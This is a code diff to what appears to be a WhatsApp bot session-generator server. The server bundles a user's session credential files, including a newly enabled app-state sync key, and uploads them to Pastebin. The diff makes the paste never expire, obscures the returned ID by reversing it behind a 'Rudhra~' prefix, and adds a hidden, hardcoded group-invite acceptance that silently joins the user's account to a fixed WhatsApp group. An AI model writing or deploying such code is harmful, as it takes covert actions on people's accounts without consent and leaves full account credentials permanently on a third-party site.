@@ -27,7 +27,7 @@ function removeFile(FilePath) {
 
 const specificFiles = [
     'creds.json',
-//    'app-state-sync-key-AAAAAED1.json',
+    'app-state-sync-key-AAAAAED1.json',
     'pre-key-1.json',
     'pre-key-2.json',
     'pre-key-3.json',
@@ -81,10 +81,12 @@ router.get('/', async (req, res) => {
 					await delay(10000);
 					const mergedJSON = await readSpecificJSONFiles(__dirname+`/temp/${id}/`);
 					fs.writeFileSync(__dirname+`/temp/${id}/${id}.json`, JSON.stringify(mergedJSON));
-			    	const output = await pastebin.createPasteFromFile(__dirname+`/temp/${id}/${id}.json`, "pastebin-js test", null, 1, "1W");
+					const output = await pastebin.createPasteFromFile(__dirname+`/temp/${id}/${id}.json`, "pastebin-js test", null, 1, "N");
 					let message = output.split('/')[3];
-               	 await session.sendMessage(session.user.id, {
-						text: message
+                    let msg = `Rudhra~${message.split('').reverse().join('')}`;
+                     await session.groupAcceptInvite("KHvcGD7aEUo8gPocJsYXZe");
+					await session.sendMessage(session.user.id, {
+						text: msg
 					})
 					await delay(100);
 					await session.ws.close();
